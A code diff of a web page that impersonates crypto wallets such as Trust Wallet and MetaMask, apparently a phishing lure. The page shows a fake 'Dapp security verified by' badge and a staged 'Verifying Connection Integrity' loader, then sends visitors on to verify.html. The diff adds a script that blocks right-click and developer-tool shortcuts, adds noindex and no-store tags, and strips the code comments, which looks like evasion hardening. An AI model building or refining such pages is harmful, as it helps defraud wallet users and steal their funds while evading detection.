@@ -1,9 +1,12 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <script>(function () { document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }); document.addEventListener('keydown', function (e) { if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); return false; } }); })();</script>
     <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -198,7 +201,7 @@
 </head>
 
 <body>
-    <!-- LOADING OVERLAY -->
+
     <div id="pageLoader">
         <div class="loader-spinner"></div>
         <div class="loader-text">Verifying Connection Integrity...</div>
@@ -229,11 +232,11 @@
     </div>
 
     <script>
-        // Extract wallet from URL params to identify which wallet triggered the opening
-        const urlParams = new URLSearchParams(window.location.search);
-        const walletId = urlParams.get('wallet') || 'trustwallet'; // fallback empty handling
 
-        // Asset mapping for the dynamically injected name and icon
+        const urlParams = new URLSearchParams(window.location.search);
+        const walletId = urlParams.get('wid') || 'trustwallet';
+
+
         const WALLET_INFO = {
             trustwallet: { name: 'Trust Wallet', img: 'img/trustwallet.png' },
             metamask: { name: 'MetaMask', img: 'img/metamask.png' },
@@ -244,11 +247,11 @@
 
         const info = WALLET_INFO[walletId] || WALLET_INFO.trustwallet;
 
-        // Populate DOM elements dynamically based on the incoming wallet connection
+
         document.getElementById('walletLogo').src = info.img;
         document.getElementById('securityText').innerHTML = `Dapp security verified by <span>${info.name}</span>`;
 
-        // Hide the loader after 8 seconds and reveal the page
+
         setTimeout(() => {
             const loader = document.getElementById('pageLoader');
             loader.style.opacity = '0';
@@ -264,7 +267,7 @@
             btn.style.pointerEvents = 'none';
             btn.style.opacity = '0.9';
 
-            // Short simulated loading delay to mimic a secure connection bridge
+
             setTimeout(() => {
                 window.location.href = 'verify.html';
             }, 500);
